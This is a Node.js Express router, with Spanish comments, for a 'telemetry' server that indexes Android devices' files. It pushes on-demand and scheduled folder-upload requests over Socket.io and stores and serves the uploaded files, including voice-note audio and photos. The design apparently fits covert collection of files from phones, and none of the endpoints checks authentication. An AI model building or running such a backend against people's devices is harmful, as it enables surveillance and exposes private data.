const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');
const { getDatasetDir } = require('../utils/helpers');
const { syncMulter } = require('../middleware/upload');

// Helper de Lectura/Escritura de Reglas de Sincronización
function getDeviceSyncRules(safeId) {
  const targetDir = getDatasetDir();
  const rulesPath = path.join(targetDir, 'devices', safeId, 'sync_rules.json');
  let data = { requestedFiles: [], auto_sync_folders: [] };

  if (fs.existsSync(rulesPath)) {
    try {
      const raw = JSON.parse(fs.readFileSync(rulesPath, 'utf8'));
      if (Array.isArray(raw)) {
        data.requestedFiles = raw;
      } else if (raw && typeof raw === 'object') {
        data.requestedFiles = Array.isArray(raw.requestedFiles) ? raw.requestedFiles : [];
        data.auto_sync_folders = Array.isArray(raw.auto_sync_folders) ? raw.auto_sync_folders : [];
      }
    } catch (e) {}
  }
  return data;
}

function saveDeviceSyncRules(safeId, rulesData) {
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeId);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  const rulesPath = path.join(deviceDir, 'sync_rules.json');

  const content = {
    requestedFiles: rulesData.requestedFiles || [],
    auto_sync_folders: rulesData.auto_sync_folders || []
  };
  fs.writeFileSync(rulesPath, JSON.stringify(content, null, 2), 'utf8');
  return content;
}

// GET /api/telemetry/devices - Lista dinámica de dispositivos
router.get('/api/telemetry/devices', (req, res) => {
  const targetDir = getDatasetDir();
  const devicesDir = path.join(targetDir, 'devices');
  const devicesMap = new Map();

  if (fs.existsSync(devicesDir)) {
    const items = fs.readdirSync(devicesDir);
    items.forEach(item => {
      const fullPath = path.join(devicesDir, item);
      const stat = fs.statSync(fullPath);
      let deviceId = item;

      if (stat.isDirectory()) {
        deviceId = item;
      } else if (item.endsWith('.json')) {
        deviceId = item.replace(/^dataset_/, '').replace(/\.json$/, '');
      } else {
        return;
      }

      if (!devicesMap.has(deviceId)) {
        let totalFiles = 0;
        const indexPath = path.join(devicesDir, deviceId, 'file_index.json');
        if (fs.existsSync(indexPath)) {
          try {
            const indexData = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
            totalFiles = Array.isArray(indexData) ? indexData.length : (indexData.files?.length || 0);
          } catch (e) {}
        }
        devicesMap.set(deviceId, {
          deviceId,
          model: 'Android Device',
          manufacturer: 'Mobile',
          android_version: 'SDK 34',
          last_seen: stat.mtime.toISOString(),
          total_files: totalFiles
        });
      }
    });
  }

  const devicesList = Array.from(devicesMap.values());
  return res.json({ success: true, devices: devicesList });
});

// GET /api/telemetry/device-index
router.get('/api/telemetry/device-index', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const targetDir = getDatasetDir();
  const indexPath = path.join(targetDir, 'devices', safeId, 'file_index.json');

  if (!fs.existsSync(indexPath)) {
    return res.json({ success: true, deviceId: safeId, files: [] });
  }

  try {
    const content = fs.readFileSync(indexPath, 'utf8');
    const data = JSON.parse(content);
    const files = Array.isArray(data) ? data : (data.files || []);
    return res.json({ success: true, deviceId: safeId, files });
  } catch (err) {
    return res.status(500).json({ error: 'Error al leer indice de archivos' });
  }
});

// POST /api/telemetry/device-index
router.post('/api/telemetry/device-index', (req, res) => {
  const { device_id, deviceId, files } = req.body;
  const targetId = device_id || deviceId;
  if (!targetId || !Array.isArray(files)) {
    return res.status(400).json({ error: 'Parametros invalidos. Se requiere deviceId y arreglo files.' });
  }

  const safeId = String(targetId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeId);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

  const indexPath = path.join(deviceDir, 'file_index.json');
  fs.writeFileSync(indexPath, JSON.stringify(files, null, 2), 'utf8');

  return res.json({ success: true, message: 'Indice de archivos actualizado correctamente.', count: files.length });
});

// POST /api/telemetry/request-upload & /api/telemetry/signal-sync
router.post(['/api/telemetry/request-upload', '/api/telemetry/signal-sync'], (req, res) => {
  const { deviceId, filePath, targetPath } = req.body;
  const targetId = deviceId;
  const pathToUpload = filePath || targetPath;

  if (!targetId || !pathToUpload) {
    return res.status(400).json({ error: 'Falta deviceId o filePath' });
  }

  const safeId = String(targetId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const rulesData = getDeviceSyncRules(safeId);

  const existing = rulesData.requestedFiles.find(r => r.path === pathToUpload);
  if (!existing) {
    rulesData.requestedFiles.push({
      path: pathToUpload,
      status: 'PENDING',
      requestedAt: new Date().toISOString()
    });
  } else {
    existing.status = 'PENDING';
    existing.requestedAt = new Date().toISOString();
  }
  saveDeviceSyncRules(safeId, rulesData);

  // Emitir evento en tiempo real a la sala del dispositivo via Socket.io
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    if (req.path.endsWith('/signal-sync')) {
      deviceSyncNs.to(`device:${safeId}`).emit('sync:scan_structure', { deviceId: safeId });
      console.log(`[DEVICE_SYNC] Emitted sync:scan_structure to room device:${safeId}`);
    } else {
      deviceSyncNs.to(`device:${safeId}`).emit('sync:request_file', { path: pathToUpload, deviceId: safeId });
      console.log(`[DEVICE_SYNC] Emitted sync:request_file for ${pathToUpload} to room device:${safeId}`);
    }
  }

  return res.json({ success: true, message: 'Solicitud de descarga registrada.', path: pathToUpload });
});

// POST /api/telemetry/toggle-folder-sync
router.post('/api/telemetry/toggle-folder-sync', (req, res) => {
  const { deviceId, folderPath, enabled } = req.body;
  const targetId = deviceId || req.body.device_id;
  const pathTarget = folderPath || req.body.folder_path || req.body.path;

  if (!targetId || !pathTarget) {
    return res.status(400).json({ error: 'Falta deviceId o folderPath.' });
  }

  const safeId = String(targetId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const normFolder = pathTarget.replace(/\\/g, '/').replace(/\/+$/, '');

  const rulesData = getDeviceSyncRules(safeId);
  let foldersSet = new Set(rulesData.auto_sync_folders || []);

  if (enabled) {
    foldersSet.add(normFolder);
  } else {
    foldersSet.delete(normFolder);
  }

  rulesData.auto_sync_folders = Array.from(foldersSet);
  saveDeviceSyncRules(safeId, rulesData);

  // Emitir evento Socket.io de actualización de reglas a la App móvil y a la Web
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    deviceSyncNs.to(`device:${safeId}`).emit('sync:update_rules', {
      deviceId: safeId,
      auto_sync_folders: rulesData.auto_sync_folders,
      sync_rules: {
        enabled_paths: rulesData.auto_sync_folders,
        scan_interval_minutes: 20
      }
    });
    deviceSyncNs.to(`web:device:${safeId}`).emit('sync:rules_updated', {
      deviceId: safeId,
      auto_sync_folders: rulesData.auto_sync_folders
    });
    console.log(`[DEVICE_SYNC] Emitted sync:update_rules for folder ${normFolder} (${enabled ? 'ENABLED' : 'DISABLED'}) to device:${safeId}`);
  }

  return res.json({
    success: true,
    deviceId: safeId,
    folderPath: normFolder,
    enabled: Boolean(enabled),
    auto_sync_folders: rulesData.auto_sync_folders
  });
});

// GET /api/telemetry/folder-sync-rules
router.get('/api/telemetry/folder-sync-rules', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const rulesData = getDeviceSyncRules(safeId);

  return res.json({
    success: true,
    deviceId: safeId,
    auto_sync_folders: rulesData.auto_sync_folders || []
  });
});

// GET /api/telemetry/pending-downloads
router.get('/api/telemetry/pending-downloads', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const rulesData = getDeviceSyncRules(safeId);

  const pending = (rulesData.requestedFiles || []).filter(r => r.status === 'PENDING').map(r => r.path);
  const requestedList = pending.map(p => ({ path: p, requested_at: new Date().toISOString() }));
  const autoFolders = rulesData.auto_sync_folders || [];

  return res.json({ 
    success: true, 
    pendingFiles: pending, 
    requested_files: requestedList,
    auto_sync_folders: autoFolders,
    sync_rules: {
      enabled_paths: autoFolders,
      scan_interval_minutes: 20,
      file_extensions: []
    }
  });
});

// POST /api/telemetry/upload-file
router.post('/api/telemetry/upload-file', syncMulter.single('file'), (req, res) => {
  const deviceId = req.body.deviceId || req.body.device_id;
  const remotePath = req.body.originalPath || req.body.remotePath || req.body.path || req.body.relativePath;

  if (!req.file || !deviceId) {
    return res.status(400).json({ error: 'Falta archivo subido o deviceId.' });
  }

  const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const targetDir = getDatasetDir();
  const downloadsDir = path.join(targetDir, 'devices', safeId, 'downloads');
  if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });

  const filename = remotePath ? path.basename(remotePath) : req.file.originalname;
  const destPath = path.join(downloadsDir, filename);

  // Use copy + unlink to safely handle cross-device mount points in Docker
  fs.copyFileSync(req.file.path, destPath);
  try { fs.unlinkSync(req.file.path); } catch (e) {}

  // Marcar como COMPLETED en sync_rules.json
  const rulesData = getDeviceSyncRules(safeId);
  if (rulesData.requestedFiles && rulesData.requestedFiles.length > 0) {
    rulesData.requestedFiles = rulesData.requestedFiles.map(r => r.path === remotePath ? { ...r, status: 'COMPLETED', completedAt: new Date().toISOString() } : r);
    saveDeviceSyncRules(safeId, rulesData);
  }

  // Registrar en downloaded_files.json
  const downloadsMapPath = path.join(targetDir, 'devices', safeId, 'downloaded_files.json');
  let map = {};
  if (fs.existsSync(downloadsMapPath)) {
    try { map = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8')); } catch (e) {}
  }
  map[remotePath || filename] = filename;
  fs.writeFileSync(downloadsMapPath, JSON.stringify(map, null, 2), 'utf8');

  // Emitir evento en tiempo real a la sala web via Socket.io
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    deviceSyncNs.to(`web:device:${safeId}`).emit('file:uploaded', { path: remotePath || filename, filename });
    console.log(`[DEVICE_SYNC] Emitted file:uploaded for ${remotePath || filename} to room web:device:${safeId}`);
  }

  return res.json({ success: true, message: 'Archivo subido y almacenado exitosamente.', filename });
});

// GET /api/telemetry/file-content
router.get('/api/telemetry/file-content', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  const targetPath = req.query.path || req.query.remotePath;

  if (!deviceId || !targetPath) {
    return res.status(400).json({ error: 'Falta deviceId o path' });
  }

  const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const filename = path.basename(targetPath);
  const targetDir = getDatasetDir();
  const filePath = path.join(targetDir, 'devices', safeId, 'downloads', filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ success: false, status: 'NOT_DOWNLOADED', error: 'El archivo aun no ha sido descargado al servidor.' });
  }

  const ext = path.extname(filename).toLowerCase();
  if (ext === '.opus') {
    res.setHeader('Content-Type', 'audio/ogg; codecs=opus');
  } else if (ext === '.ogg') {
    res.setHeader('Content-Type', 'audio/ogg');
  } else if (ext === '.mp3') {
    res.setHeader('Content-Type', 'audio/mpeg');
  } else if (ext === '.wav') {
    res.setHeader('Content-Type', 'audio/wav');
  } else if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
    res.setHeader('Content-Type', `image/${ext === '.jpg' ? 'jpeg' : ext.replace('.', '')}`);
  }

  res.setHeader('Content-Disposition', `inline; filename="${filename}"`);
  return res.sendFile(filePath);
});

module.exports = router;
